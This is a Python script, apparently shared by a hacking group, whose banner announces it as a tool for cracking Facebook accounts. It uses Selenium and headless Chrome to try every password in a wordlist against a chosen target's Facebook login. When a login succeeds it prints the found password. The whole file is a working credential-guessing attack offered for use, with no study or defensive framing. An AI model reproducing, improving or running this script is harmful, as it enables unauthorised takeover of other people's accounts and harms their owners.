#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Mod by: SCREENLAVERS
# team: INDONESIAN ATTACK CYBER

import os
import sys
import time
import subprocess
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException, WebDriverException
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Warna untuk teks
wd = "\033[90;1m"  # dark
GL = "\033[96;1m"  # Blue aqua
BB = "\033[34;1m"  # Blue light
YY = "\033[33;1m"  # Yellow light
GG = "\033[32;1m"  # Green light
WW = "\033[0;1m"   # White light
RR = "\033[31;1m"  # Red light
CC = "\033[36;1m"  # Cyan light

def runntxt(s):
    for char in s + '\n':
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(10. / 2100)

def install_requirements():
    print(GG + "[*] Memastikan bahwa semua dependensi terinstal...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "selenium", "webdriver_manager"])
        print(GG + "[*] Selenium dan webdriver_manager berhasil diinstal!")
    except subprocess.CalledProcessError:
        print(RR + "[!] Gagal menginstal Selenium atau webdriver_manager.")
        sys.exit(1)

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')  
    print(" ")
    runntxt(GL + "   ..LOADING, HARAP BERSABAR .....")
    time.sleep(1) 
    runntxt(WW + "   ....")
    time.sleep(0.9)     
    runntxt(WW + "   ......")
    time.sleep(0.8) 
    runntxt(GL + "   ........")
    time.sleep(0.7) 
    runntxt(GG + "   ..........")
    time.sleep(0.6) 
    runntxt(YY + "   ............")
    time.sleep(0.5)     
    runntxt(GG + "   MEMBUKA SCRIPT.............................")
    time.sleep(2)  
    os.system('cls' if os.name == 'nt' else 'clear')  

    print(GG + "  √=============================================√")
    print(GL + "  |••••••    CRACKING FACEBOOK ACCOUNT    ••••••|")
    print(GG + "  √=============================================√")
    print(WW + "  |           AUTHOR : SCREENLAVERS             |")
    print(GL + "  |  TELEGRAM : https://t.me/+ep9c0nTDAGxlMTVl  |")
    print(WW + "  |          TEAM : LAMPUNG CYBER TEAM          |")
    print(YY + "  |               NO SYSTEM IS SAFE             |")
    print(GL + "  |---------------------------------------------|")
    print(GL + "  |          NO HACK NO LIFE [ ATTACKER ]       |")
    print(GL + "  |---------------------------------------------|")
    print(GG + "  √=============================================√")
    print(GL + "  |•••••••••    SELAMAT MENGGUNAKAN    •••••••••|")
    print(GG + "  √=============================================√")

def main():
    chrome_options = Options()
    chrome_options.add_argument("--headless")  # Menjalankan di background
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")

    # Menggunakan ChromeDriverManager untuk mengelola chromedriver
    try:
        # Menggunakan Service untuk inisialisasi ChromeDriver
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)

        print(wd + "         Selamat Menggunakan ")
        print(GG + "╭────\033[91m[\033[96m Masukkan ID\033[95m / \033[96mUsername Target\033[91m] ")
        email_target = str(input(GL + "\033[92m╰────➲\033[93m  "))
        print(" ")
        print("\033[92m╭────\033[91m[ \033[96mMasukkan File Wordlist \033[95m( pass.txt ) \033[91;1m] ")
        password_list = str(input(GG + "╰────➲\033[93m "))

        print(wd + " [#] ID / Username Target\033[97;1m: {}".format(email_target))
        
        driver.get("https://www.facebook.com/login.php")
        
        # Tunggu hingga elemen email tersedia
        email_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, "email"))
        )
        
        found_password = False  # Flag untuk memeriksa apakah password ditemukan
        with open(password_list, "r") as file:
            for line in file:
                password = line.strip()
                print(GG + f"\n[\033[91m+\033[92m]\033[91;1m [\033[97m{email_target}\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m{password}\033[0m]")
                
                email_element.clear()  # Clear input sebelum mengisi
                email_element.send_keys(email_target)
                
                # Tunggu hingga elemen password tersedia
                password_element = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.NAME, "pass"))
                )
                password_element.clear()  # Clear input sebelum mengisi
                password_element.send_keys(password)

                # Tunggu hingga tombol login tersedia
                login_button = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.NAME, "login"))
                )
                login_button.click()
                time.sleep(2)

                if "login_attempt" not in driver.current_url:
                    print(" ")
                    print("\033[96m                S U C C E S S")
                    print("          P A S S W O R D  F I N D ")
                    print(RR + "+-------------------------------------------+")
                    print(RR + f"#\033[97m ID / Email Target:\033[92m {email_target}")
                    print(RR + f"#\033[97m Password Target:\033[92m {password}")
                    print(" ")
                    found_password = True  # Menandai bahwa password ditemukan
                    input(WW + "TEKAN ENTER UNTUK KELUAR...")
                    break
                else:
                    print(RR + f"Password \033[91m{password}\033[0m GAGAL! Mencoba password berikutnya...")
                    driver.get("https://www.facebook.com/login.php")
                    # Tunggu hingga elemen email tersedia lagi
                    email_element = WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((By.NAME, "email"))
                    )

        if not found_password:
            print(RR + "\n[!] Password tidak ditemukan setelah mencoba semua password dalam list.")
            countdown(5)  # Menghitung mundur sebelum kembali ke menu

    except WebDriverException as e:
        print(RR + f"\nKesalahan WebDriver: {str(e)}")
    except FileNotFoundError:
        print(RR + f"\nFile tidak ditemukan: Pastikan file '{password_list}' ada.")
    except Exception as e:
        print(RR + f"\nKesalahan: {str(e)}")
    finally:
        driver.quit()
        os.system('cls' if os.name == 'nt' else 'clear')  # Menghapus tampilan setelah selesai

def countdown(seconds):
    for i in range(seconds, 0, -1):
        print(GG + f"Kembali ke menu utama dalam {i} detik...", end='\r')  # Gunakan end='\r' untuk menimpa baris yang sama
        time.sleep(1)
    print(GG + "Kembali ke menu utama dalam 0 detik...")  # Menampilkan akhir hitungan mundur

def menu():
    banner()
    while True:  # Loop untuk memastikan menu terus tampil
        print(GG + "Pilih Menu:")
        print(YY + "[1] Install Semua Tools yang Diperlukan")
        print(YY + "[2] Jalankan Script Utama")
        print(YY + "[3] Keluar")  # Menambahkan opsi keluar
        choice = input(GL + "Pilih opsi (1/2/3): ")
        
        if choice == "1":
            install_requirements()
            print(GG + "\n[*] Semua dependensi telah diinstal dan ChromeDriver siap digunakan!")
            countdown(5)  # Menghitung mundur sebelum kembali ke menu
            banner()  # Menampilkan banner lagi setelah hitung mundur
        elif choice == "2":
            main()
            os.system('cls' if os.name == 'nt' else 'clear')  # Menghapus tampilan setelah menyelesaikan script utama
            banner()  # Menampilkan banner lagi setelah kembali ke menu
        elif choice == "3":
            print(GG + "Terima kasih telah menggunakan script ini. Selamat tinggal!")
            sys.exit(0)
        else:
            print(RR + "[!] Pilihan tidak valid. Silakan coba lagi.")
            countdown(5)  # Menghitung mundur sebelum kembali ke menu
            os.system('cls' if os.name == 'nt' else 'clear')  # Menghapus tampilan sebelumnya
            banner()  # Menampilkan banner lagi

if __name__ == '__main__':
    menu()
